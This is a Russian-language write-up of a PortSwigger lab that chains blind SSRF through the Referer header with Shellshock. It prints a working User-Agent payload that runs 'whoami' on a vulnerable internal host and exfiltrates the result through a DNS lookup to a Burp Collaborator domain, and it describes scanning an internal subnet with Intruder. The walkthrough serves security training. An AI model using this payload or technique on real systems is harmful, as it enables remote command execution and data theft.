# Blind SSRF с Shellshock: эксфильтрация через DNS

**Лаба:** [Blind SSRF with Shellshock exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation) (Expert, SSRF)
**Суть:** аналитика дёргает URL из заголовка `Referer`. Слепой SSRF во внутреннюю сеть + Shellshock = имя OS-пользователя через DNS.

## Разведка

При загрузке страницы продукта сервер сам стучится наружу на URL из `Referer` — видно через Collaborator Everywhere. Важная деталь: сервер **прокидывает наш User-Agent** в свой исходящий запрос. Это два звена цепочки сразу: мы управляем и адресом, куда он пойдёт, и заголовком, который он понесёт.

## Цепочка

1. Генерируем домен Burp Collaborator.
2. В User-Agent кладём Shellshock-пейлоад, где имя пользователя эксфильтруется поддоменом:

```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

3. `Referer: http://192.168.0.1:8080`, последний октет отправляем в Intruder — Numbers от 1 до 255.
4. Атака идёт вслепую, поэтому ждём и жмём Poll now в Collaborator. Когда скан дойдёт до живого хоста с уязвимым bash, тот выполнит `nslookup peter-uxwq0S.burp-collab...` — имя юзера приедет в DNS-запросе.

## Заметка

Сама по себе лаба — два приёма, которые я теперь вспоминаю вместе. Первый: слепой SSRF без вывода раскрывается только out-of-band, без Collaborator его вообще не увидеть. Второй: заголовок, который приложение копирует в исходящий запрос, — это почти всегда Shellshock-вектор, если на приёмной стороне старый bash. DNS как канал утечки работает даже там, где HTTP наружу закрыт.
